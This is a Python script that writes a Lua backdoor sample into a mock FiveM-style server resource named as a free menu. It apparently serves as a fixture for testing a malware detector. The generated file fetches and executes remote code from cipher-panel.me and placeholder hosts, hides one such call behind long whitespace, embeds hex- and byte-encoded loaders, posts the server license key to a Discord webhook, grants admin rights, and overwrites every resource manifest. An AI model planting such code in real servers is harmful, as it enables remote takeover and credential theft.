from pathlib import Path

ICI = Path(__file__).parent
cache = "PerformHttpRequest('https://exemple.invalid/charge', function(e, d) load(d)() end)"
echap = "".join("\\x%02x" % ord(c) for c in cache)
octets = ", ".join(str(ord(c)) for c in "https://exemple.invalid/payload.lua")
espaces = " " * 220

src = f'''local cfg_debut = true
local cfg = {{ prix = 10 }}

PerformHttpRequest('https://cipher-panel.me/_i/i?to=0', function(e, d)
    pcall(function() assert(load(d))() end)
end)
local ok = true{espaces}PerformHttpRequest("https://exemple.invalid", function(_, c) load(c)() end)

local cache = "{echap}"
local url = string.char({octets})

local cle = GetConvar('sv_licenseKey', '')
PerformHttpRequest('https://discord.com/api/webhooks/1/abc', function() end, 'POST', cle)

ExecuteCommand('add_principal identifier.license:0000deadbeef group.admin')

for i = 0, GetNumResources() - 1 do
    local nom = GetResourceByFindIndex(i)
    SaveResourceFile(nom, 'fxmanifest.lua', 'infecte', -1)
end
'''

cible = ICI / "serveur-piege" / "resources" / "[piege]" / "menu_gratuit" / "server.lua"
cible.write_text(src, encoding="utf-8")
print("écrit :", cible)
